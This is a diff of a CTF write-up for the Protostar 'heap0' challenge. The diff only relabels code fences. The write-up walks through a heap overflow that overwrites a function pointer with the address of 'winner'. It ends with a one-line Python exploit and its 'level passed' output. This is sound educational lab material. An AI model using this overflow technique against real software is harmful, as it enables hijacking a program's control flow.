@@ -2,7 +2,7 @@
 
 Let's take a look at the binary. Also this challenge is a bit different from the others, the goal is to run the `winner` function. Also I recompiled this challenge from source:
 
-```
+```console
 $    file heap0
 heap0: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=ca0d25fb47b05e42811810bf08e5376b33f64501, not stripped
 $    pwn checksec heap0
@@ -22,7 +22,7 @@ level has not been passed
 
 So we can see it prints out what looks like two heap addresses, and takes in input as an argument. In addition to that we see that there is no PIE, and it is a 32 bit binary. When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 undefined4 main(undefined4 param_1,int param_2)
@@ -45,7 +45,7 @@ So we can see a few things. First that it allocates two separate heap chunks, on
 
 So we have an overflow. With it we will use it to overwrite the value of `ptr1` to be that of the `winner` function. When we ran it, we can see that `ptr0` was at `0x56c08160` and `ptr1` was at `0x56c081b0` (for the second iteration of running it). So after `0x56c081b0 - 0x56c08160 = 0x50` bytes of space between the start of our input and the instruction pointer stored in `ptr1`. Next we need the address of `winner`:
 
-```
+```console
 $    objdump -D heap0 | grep winner
 080484b6 <winner>:
 080484e1 <nowinner>:
@@ -53,7 +53,7 @@ $    objdump -D heap0 | grep winner
 
 With that, we have everything we need to solve the challenge:
 
-```
+```console
 $    ./heap0 `python -c 'print "0"*0x50 + "\xb6\x84\x04\x08"'`
 data is at 0x98ac160, fp is at 0x98ac1b0
 level passed
